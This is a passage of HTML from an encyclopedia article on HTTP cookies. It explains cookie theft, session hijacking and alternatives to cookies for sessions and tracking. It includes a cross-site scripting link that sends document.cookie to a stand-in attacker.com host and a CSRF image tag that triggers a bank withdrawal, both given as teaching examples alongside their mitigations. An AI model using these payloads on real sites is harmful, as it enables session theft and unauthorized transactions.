    </div>
</div><span class="hide-when-compact"><i> (<small><a href="/wiki/Help:Maintenance_template_removal" title="Help:Maintenance template removal">Learn how and when to remove this message</a></small>)</i></span></div></td></tr></tbody></table>
<p>Most websites use cookies as the only identifiers for user sessions, because other methods of identifying web users have limitations and vulnerabilities. If a website uses cookies as session identifiers, attackers can impersonate users' requests by stealing a full set of victims' cookies. From the web server's point of view, a request from an attacker then has the same authentication as the victim's requests; thus the request is performed on behalf of the victim's session.
</p><p>Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) that work with websites relying solely on HTTP cookies for user identification.
</p>
<div class="mw-heading mw-heading3"><h3 id="Network_eavesdropping">Network eavesdropping</h3></div>
<figure class="mw-default-size" typeof="mw:File/Thumb"><a href="/wiki/File:Cookie-sniffing.svg" class="mw-file-description"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Cookie-sniffing.svg/250px-Cookie-sniffing.svg.png" decoding="async" width="250" height="125" class="mw-file-element" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Cookie-sniffing.svg/500px-Cookie-sniffing.svg.png 1.5x" data-file-width="200" data-file-height="100"></a><figcaption>A cookie can be stolen by another computer that is allowed reading from the network.</figcaption></figure>
<p>Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over <a href="/wiki/Plaintext" title="Plaintext">unencrypted</a> open <a href="/wiki/Wi-Fi" title="Wi-Fi">Wi-Fi</a>). This traffic includes cookies sent on ordinary unencrypted <a href="/wiki/HTTP_sessions" class="mw-redirect" title="HTTP sessions">HTTP sessions</a>. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a <a href="/wiki/Man-in-the-middle_attack" title="Man-in-the-middle attack">man-in-the-middle attack</a>.
</p><p>An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim's bank account.
</p><p>This issue can be resolved by securing the communication between the user's computer and the server by employing <a href="/wiki/Transport_Layer_Security" title="Transport Layer Security">Transport Layer Security</a> (<a href="/wiki/HTTPS" title="HTTPS">HTTPS</a> protocol) to encrypt the connection. A server can specify the <code>Secure</code> flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as a TLS connection.<sup id="cite&#95;ref-httponlyrfc&#95;46-1" class="reference"><a href="#cite_note-httponlyrfc-46"><span class="cite-bracket">&#91;</span>46<span class="cite-bracket">&#93;</span></a></sup>
</p>
<div class="mw-heading mw-heading3"><h3 id="Publishing_false_sub-domain:_DNS_cache_poisoning">Publishing false sub-domain: DNS cache poisoning</h3></div>
<p>If an attacker is able to cause a <a href="/wiki/DNS_server" class="mw-redirect" title="DNS server">DNS server</a> to cache a fabricated DNS entry (called <a href="/wiki/DNS_cache_poisoning" class="mw-redirect" title="DNS cache poisoning">DNS cache poisoning</a>), then this could allow the attacker to gain access to a user's cookies. For example, an attacker could use DNS cache poisoning to create a fabricated DNS entry of <code>f12345.www.example.com</code> that points to the <a href="/wiki/IP_address" title="IP address">IP address</a> of the attacker's server. The attacker can then post an image URL from his own server (for example, <code>http://f12345.www.example.com/img_4_cookie.jpg</code>). Victims reading the attacker's message would download this image from <code>f12345.www.example.com</code>. Since <code>f12345.www.example.com</code> is a sub-domain of <code>www.example.com</code>, victims' browsers would submit all <code>example.com</code>-related cookies to the attacker's server.
</p><p>If an attacker is able to accomplish this, it is usually the fault of the <a href="/wiki/Internet_service_provider" title="Internet service provider">Internet service providers</a> for not properly securing their DNS servers. However, the severity of this attack can be lessened if the target website uses secure cookies. In this case, the attacker would have the extra challenge<sup id="cite&#95;ref-certificatehack&#95;95-0" class="reference"><a href="#cite_note-certificatehack-95"><span class="cite-bracket">&#91;</span>95<span class="cite-bracket">&#93;</span></a></sup> of obtaining the target website's TLS certificate from a <a href="/wiki/Certificate_authority" title="Certificate authority">certificate authority</a>, since secure cookies can only be transmitted over an encrypted connection. Without a matching TLS certificate, victims' browsers would display a warning message about the attacker's invalid certificate, which would help deter users from visiting the attacker's fraudulent website and sending the attacker their cookies.
</p>
<div class="mw-heading mw-heading3"><h3 id="Cross-site_scripting:_cookie_theft">Cross-site scripting: cookie theft</h3></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Cross-site_scripting" title="Cross-site scripting">Cross-site scripting</a></div>
<p>Cookies can also be stolen using a technique called cross-site scripting. This occurs when an attacker takes advantage of a website that allows its users to post unfiltered <a href="/wiki/HTML" title="HTML">HTML</a> and <a href="/wiki/JavaScript" title="JavaScript">JavaScript</a> content. By posting malicious HTML and JavaScript code, the attacker can cause the victim's web browser to send the victim's cookies to a website the attacker controls.
</p><p>As an example, an attacker may post a message on <code>www.example.com</code> with the following link:
</p>
<div class="mw-highlight mw-highlight-lang-html mw-content-ltr" dir="ltr"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;window.location = &#39;http://attacker.com/stole.cgi?text=&#39; + escape(document.cookie); return false;&quot;</span><span class="p">&gt;</span>Click here!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
<figure class="mw-default-size" typeof="mw:File/Thumb"><a href="/wiki/File:Cookie-theft.svg" class="mw-file-description"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Cookie-theft.svg/250px-Cookie-theft.svg.png" decoding="async" width="250" height="125" class="mw-file-element" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Cookie-theft.svg/500px-Cookie-theft.svg.png 1.5x" data-file-width="200" data-file-height="100"></a><figcaption>Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.</figcaption></figure>
<p>When another user clicks on this link, the browser executes the piece of code within the <code>onclick</code> attribute, thus replacing the string <code>document.cookie</code> with the list of cookies that are accessible from the current page. As a result, this list of cookies is sent to the <code>attacker.com</code> server. If the attacker's malicious posting is on an HTTPS website <code>https://www.example.com</code>, secure cookies will also be sent to attacker.com in plain text.
</p><p>It is the responsibility of the website developers to filter out such malicious code.
</p><p>Such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client-side scripting languages like JavaScript, and therefore, the attacker will not be able to gather these cookies.
</p>
<div class="mw-heading mw-heading3"><h3 id="Cross-site_scripting:_proxy_request">Cross-site scripting: proxy request</h3></div>
<p>In older versions of many browsers, there were security holes in the implementation of the <a href="/wiki/XMLHttpRequest" title="XMLHttpRequest">XMLHttpRequest</a> API. This API allows pages to specify a proxy server that would get the reply, and this proxy server is not subject to the <a href="/wiki/Same-origin_policy" title="Same-origin policy">same-origin policy</a>. For example, a victim is reading an attacker's posting on <code>www.example.com</code>, and the attacker's script is executed in the victim's browser. The script generates a request to <code>www.example.com</code> with the proxy server <code>attacker.com</code>. Since the request is for <code>www.example.com</code>, all <code>example.com</code> cookies will be sent along with the request, but routed through the attacker's proxy server. Hence, the attacker would be able to harvest the victim's cookies.
</p><p>This attack would not work with secure cookies, since they can only be transmitted over <a href="/wiki/HTTPS" title="HTTPS">HTTPS</a> connections, and the HTTPS protocol dictates <a href="/wiki/End-to-end_encryption" title="End-to-end encryption">end-to-end encryption</a> (i.e. the information is encrypted on the user's browser and decrypted on the destination server). In this case, the proxy server would only see the raw, encrypted bytes of the HTTP request.
</p>
<div class="mw-heading mw-heading3"><h3 id="Cross-site_request_forgery">Cross-site request forgery</h3></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Cross-site_request_forgery" title="Cross-site request forgery">Cross-site request forgery</a></div>
<p>For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,
</p>
 <div class="mw-highlight mw-highlight-lang-xml mw-content-ltr" dir="ltr"><pre><span></span><span class="nt">&lt;img</span><span class="w"> </span><span class="na">src=</span><span class="s">&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;</span><span class="nt">&gt;</span>
</pre></div>
<p>If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.
</p>
<div class="mw-heading mw-heading3"><h3 id="Cookiejacking">Cookiejacking</h3></div>
<p><b>Cookiejacking</b> is an attack against <a href="/wiki/Internet_Explorer" title="Internet Explorer">Internet Explorer</a> which allows the attacker to steal <a href="/wiki/Session_cookie" class="mw-redirect" title="Session cookie">session cookies</a> of a user by tricking a user into dragging an object across the screen.<sup id="cite&#95;ref-finkle&#95;96-0" class="reference"><a href="#cite_note-finkle-96"><span class="cite-bracket">&#91;</span>96<span class="cite-bracket">&#93;</span></a></sup> Microsoft deemed the flaw low-risk because of "the level of required user interaction",<sup id="cite&#95;ref-finkle&#95;96-1" class="reference"><a href="#cite_note-finkle-96"><span class="cite-bracket">&#91;</span>96<span class="cite-bracket">&#93;</span></a></sup> and the necessity of having a user already logged into the website whose cookie is stolen.<sup id="cite&#95;ref-whitney&#95;97-0" class="reference"><a href="#cite_note-whitney-97"><span class="cite-bracket">&#91;</span>97<span class="cite-bracket">&#93;</span></a></sup> Despite this, a researcher tried the attack on 150 of their Facebook friends and obtained cookies of 80 of them via <a href="/wiki/Social_engineering_(security)" title="Social engineering (security)">social engineering</a>.<sup id="cite&#95;ref-finkle&#95;96-2" class="reference"><a href="#cite_note-finkle-96"><span class="cite-bracket">&#91;</span>96<span class="cite-bracket">&#93;</span></a></sup>
</p>
<div class="mw-heading mw-heading2"><h2 id="Drawbacks_of_cookies">Drawbacks of cookies</h2></div>
<p>Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (<a href="/wiki/Representational_State_Transfer" class="mw-redirect" title="Representational State Transfer">REST</a>) software architectural style.<sup id="cite&#95;ref-tBPhf&#95;98-0" class="reference"><a href="#cite_note-tBPhf-98"><span class="cite-bracket">&#91;</span>98<span class="cite-bracket">&#93;</span></a></sup><sup id="cite&#95;ref-gdVMy&#95;99-0" class="reference"><a href="#cite_note-gdVMy-99"><span class="cite-bracket">&#91;</span>99<span class="cite-bracket">&#93;</span></a></sup>
</p>
<div class="mw-heading mw-heading3"><h3 id="Inaccurate_identification">Inaccurate identification</h3></div>
<p>If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence, cookies do not identify a person, but a combination of a user account, a computer, and a web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.<sup id="cite&#95;ref-sD3KB&#95;100-0" class="reference"><a href="#cite_note-sD3KB-100"><span class="cite-bracket">&#91;</span>100<span class="cite-bracket">&#93;</span></a></sup>
</p><p>Likewise, cookies do not differentiate between multiple users who share the same <a href="/wiki/User_account" class="mw-redirect" title="User account">user account</a>, computer, and browser.
</p>
<div class="mw-heading mw-heading2"><h2 id="Alternatives_to_cookies">Alternatives to cookies</h2></div>
<p>Some of the operations that can be done using cookies can also be done using other mechanisms.
</p>
<div class="mw-heading mw-heading3"><h3 id="Authentication_and_session_management">Authentication and session management</h3></div>
<div class="mw-heading mw-heading4"><h4 id="JSON_Web_Tokens">JSON Web Tokens</h4></div>
<p>A <a href="/wiki/JSON_Web_Token" title="JSON Web Token">JSON Web Token</a> (JWT) is a self-contained packet of information that can be used to store user identity and authenticity information. This allows them to be used in place of session cookies. Unlike cookies, which are automatically attached to each HTTP request by the browser, JWTs must be explicitly attached to each HTTP request by the web application.
</p>
<div class="mw-heading mw-heading4"><h4 id="HTTP_authentication">HTTP authentication</h4></div>
<p>The HTTP protocol includes the <a href="/wiki/Basic_access_authentication" title="Basic access authentication">basic access authentication</a> and the <a href="/wiki/Digest_access_authentication" title="Digest access authentication">digest access authentication</a> protocols, which allow access to a web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.
</p>
<div class="mw-heading mw-heading4"><h4 id="URL_(query_string)"><span id="URL_.28query_string.29"></span>URL (query string)</h4></div>
<p>The <a href="/wiki/Query_string" title="Query string">query string</a> part of the <a href="/wiki/Uniform_Resource_Locator" class="mw-redirect" title="Uniform Resource Locator">URL</a> is the part that is typically used for this purpose, but other parts can be used as well. The <a href="/wiki/Java_Servlet" class="mw-redirect" title="Java Servlet">Java Servlet</a> and <a href="/wiki/PHP" title="PHP">PHP</a> session mechanisms both use this method if cookies are not enabled.
</p><p>This method consists of the web server appending query strings containing a unique session identifier to all the links inside of a web page. When the user follows a link, the browser sends the query string to the server, allowing the server to identify the user and maintain state.
</p><p>These kinds of query strings are very similar to cookies in that both contain arbitrary pieces of information chosen by the server and both are sent back to the server on every request. However, there are some differences. Since a query string is part of a URL, if that URL is later reused, the same attached piece of information will be sent to the server, which could lead to confusion. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by <a href="/wiki/E-mail" class="mw-redirect" title="E-mail">e-mail</a>, those preferences will be used for that other user as well.
</p><p>Moreover, if the same user accesses the same page multiple times from different sources, there is no guarantee that the same query string will be used each time. For example, if a user visits a page by coming from a page <i>internal to the site</i> the first time, and then visits the same page by coming from an <i>external <a href="/wiki/Search_engine" title="Search engine">search engine</a></i> the second time, the query strings would likely be different. If cookies were used in this situation, the cookies would be the same.
</p><p>Other drawbacks of query strings are related to security. Storing data that identifies a session in a query string enables <a href="/wiki/Session_fixation" title="Session fixation">session fixation</a> attacks, <a href="/wiki/HTTP_referer" title="HTTP referer">referer</a> logging attacks and other <a href="/wiki/Exploit_(computer_security)" title="Exploit (computer security)">security exploits</a>. Transferring session identifiers as HTTP cookies is more secure.
</p>
<div class="mw-heading mw-heading4"><h4 id="Hidden_form_fields">Hidden form fields</h4></div>
<p>Another form of session tracking is to use <a href="/wiki/Form_(web)" class="mw-redirect" title="Form (web)">web forms</a> with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks. In fact, if the form is handled with the <a href="/wiki/HTTP" title="HTTP">HTTP</a> GET method, then this technique is similar to using URL query strings, since the GET method adds the form fields to the URL as a query string. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be sent in the HTTP request body, which is neither part of the URL, nor of a cookie.
</p><p>This approach presents two advantages from the point of view of the tracker. First, having the tracking information placed in the HTTP request body rather than in the URL means it will not be noticed by the average user. Second, the session information is not copied when the user copies the URL (to bookmark the page or send it via email, for example).
</p>
<div class="mw-heading mw-heading4"><h4 id="window.name_DOM_property">window.name DOM property</h4></div>
<p>All current web browsers can store a fairly large amount of data (2–32&#160;MB) via JavaScript using the <a href="/wiki/Document_Object_Model" title="Document Object Model">DOM</a> property <code>window.name</code>. This data can be used instead of session cookies. The technique can be coupled with <a href="/wiki/JSON" title="JSON">JSON</a>/JavaScript objects to store complex sets of session variables on the client side.
</p><p>The downside is that every separate window or <a href="/wiki/Tabbed_document_interface" class="mw-redirect" title="Tabbed document interface">tab</a> will initially have an empty <code>window.name</code> property when opened.
</p><p>In some respects, this can be more secure than cookies because its contents are not automatically sent to the server on every request like cookies are, so it is not vulnerable to network cookie sniffing attacks.
</p>
<div class="mw-heading mw-heading3"><h3 id="Tracking_2">Tracking</h3></div>
<div class="mw-heading mw-heading4"><h4 id="IP_address">IP address</h4></div>
<p>Some users may be tracked based on the <a href="/wiki/IP_address" title="IP address">IP address</a> of the computer requesting the page. The server knows the IP address of the computer running the browser (or the <a href="/wiki/Proxy_server" title="Proxy server">proxy</a>, if any is used) and could theoretically link a user's session to this IP address.
</p><p>However, IP addresses are generally not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as <a href="/wiki/Tor_(anonymity_network)" class="mw-redirect" title="Tor (anonymity network)">Tor</a>, are designed to retain <a href="/wiki/Internet_anonymity" class="mw-redirect" title="Internet anonymity">Internet anonymity</a>, rendering tracking by IP address impractical, impossible, or a security risk.
</p>
<div class="mw-heading mw-heading4"><h4 id="ETag">ETag</h4></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/HTTP_ETag#Tracking_using_ETags" title="HTTP ETag">HTTP ETag §&#160;Tracking using ETags</a></div>
<p>Because ETags are cached by the browser, and returned with subsequent requests for the same resource, a tracking server can simply repeat any ETag received from the browser to ensure an assigned ETag persists indefinitely (in a similar way to persistent cookies). Additional caching header fields can also enhance the preservation of ETag data.
</p><p>ETags can be flushed in some browsers by clearing the <a href="/wiki/Browser_cache" class="mw-redirect" title="Browser cache">browser cache</a>.
</p>
<div class="mw-heading mw-heading4"><h4 id="Browser_cache">Browser cache</h4></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Web_cache" title="Web cache">Web cache</a></div>
<p>The browser cache can also be used to store information that can be used to track individual users. This technique takes advantage of the fact that the web browser will use resources stored within the cache instead of downloading them from the website when it determines that the cache already has the most up-to-date version of the resource.
</p><p>For example, a website could serve a JavaScript file with code that sets a unique identifier for the user (for example, <code>var userId = 3243242;</code>). After the user's initial visit, every time the user accesses the page, this file will be loaded from the cache instead of downloaded from the server. Thus, its content will never change.
</p>
<div class="mw-heading mw-heading4"><h4 id="Browser_fingerprint">Browser fingerprint</h4></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Device_fingerprint" title="Device fingerprint">Device fingerprint</a></div>
<p>A <a href="/wiki/Browser_fingerprint" class="mw-redirect" title="Browser fingerprint">browser fingerprint</a> is information collected about a browser's configuration, such as version number, screen resolution, and operating system, for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.
</p><p>Basic <a href="/wiki/Web_browser" title="Web browser">web browser</a> configuration information has long been collected by <a href="/wiki/Web_analytics" title="Web analytics">web analytics</a> services in an effort to accurately measure real human <a href="/wiki/Web_traffic" title="Web traffic">web traffic</a> and discount various forms of <a href="/wiki/Click_fraud" title="Click fraud">click fraud</a>. With the assistance of <a href="/wiki/Client-side_scripting" class="mw-redirect" title="Client-side scripting">client-side scripting</a> languages, collection of much more esoteric parameters is possible.<sup id="cite&#95;ref-7MnkN&#95;101-0" class="reference"><a href="#cite_note-7MnkN-101"><span class="cite-bracket">&#91;</span>101<span class="cite-bracket">&#93;</span></a></sup><sup id="cite&#95;ref-H8nQP&#95;102-0" class="reference"><a href="#cite_note-H8nQP-102"><span class="cite-bracket">&#91;</span>102<span class="cite-bracket">&#93;</span></a></sup> Assimilation of such information into a single string constitutes a device fingerprint. In 2010, <a href="/wiki/Electronic_Frontier_Foundation" title="Electronic Frontier Foundation">EFF</a> measured at least 18.1 bits of <a href="/wiki/Entropy_(information_theory)" title="Entropy (information theory)">entropy</a> possible from browser fingerprinting.<sup id="cite&#95;ref-Ar32G&#95;103-0" class="reference"><a href="#cite_note-Ar32G-103"><span class="cite-bracket">&#91;</span>103<span class="cite-bracket">&#93;</span></a></sup> <a href="/wiki/Canvas_fingerprinting" title="Canvas fingerprinting">Canvas fingerprinting</a>, a more recent technique, claims to add another 5.7 bits.
</p>
<div class="mw-heading mw-heading3"><h3 id="Web_storage">Web storage</h3></div>
<div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Web_storage" title="Web storage">Web storage</a></div>
<p>Some web browsers support persistence mechanisms which allow the page to store the information locally for later use.
</p><p>The <a href="/wiki/HTML5" title="HTML5">HTML5</a> standard (which most modern web browsers support to some extent) includes a JavaScript API called <a href="/wiki/Web_storage" title="Web storage">Web storage</a> that allows two types of storage: local storage and session storage. Local storage behaves similarly to <a href="#Persistent_cookie">persistent cookies</a> while session storage behaves similarly to <a href="#Session_cookie">session cookies</a>, except that session storage is tied to an individual tab/window's lifetime (AKA a page session), not to a whole browser session like session cookies.<sup id="cite&#95;ref-7Tuzm&#95;104-0" class="reference"><a href="#cite_note-7Tuzm-104"><span class="cite-bracket">&#91;</span>104<span class="cite-bracket">&#93;</span></a></sup>
</p><p>Internet Explorer supports persistent information<sup id="cite&#95;ref-dttaK&#95;105-0" class="reference"><a href="#cite_note-dttaK-105"><span class="cite-bracket">&#91;</span>105<span class="cite-bracket">&#93;</span></a></sup> in the browser's history, in the browser's favorites, in an XML store ("user data"), or directly within a web page saved to disk.
</p><p>Some web browser plugins include persistence mechanisms as well. For example, <a href="/wiki/Adobe_Flash" title="Adobe Flash">Adobe Flash</a> has <a href="/wiki/Local_shared_object" title="Local shared object">Local shared object</a> and <a href="/wiki/Microsoft_Silverlight" title="Microsoft Silverlight">Microsoft Silverlight</a> has Isolated storage.<sup id="cite&#95;ref-7LUgp&#95;106-0" class="reference"><a href="#cite_note-7LUgp-106"><span class="cite-bracket">&#91;</span>106<span class="cite-bracket">&#93;</span></a></sup>
</p>
